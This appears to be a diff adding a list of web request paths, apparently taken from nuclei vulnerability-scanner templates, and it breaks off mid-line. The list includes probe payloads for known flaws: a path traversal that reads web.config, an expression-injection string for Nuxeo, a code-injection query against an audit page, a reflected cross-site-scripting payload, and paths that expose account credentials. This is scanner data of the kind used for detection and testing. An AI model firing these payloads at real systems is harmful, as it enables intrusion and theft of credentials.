@@ -1,0 +1,13 @@
+/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*
+/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*
+/cgi-bin/logoff.cgi
+/web.config.i18n.ashx?l=nuclei&v=nuclei
+/SWNetPerfMon.db.i18n.ashx?l=nuclei&v=nuclei
+/api/snapshots/:key
+/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0
+/nuxeo/login.jsp/pwn${31333333330+7}.xhtml
+/api/system/deviceinfo
+/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
+/cgi-bin/nobody/VerifyCode.cgi?account={{base64(username +
+/wp-admin/admin-ajax.php?action=eventon_ics_download&event_id=1
+/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
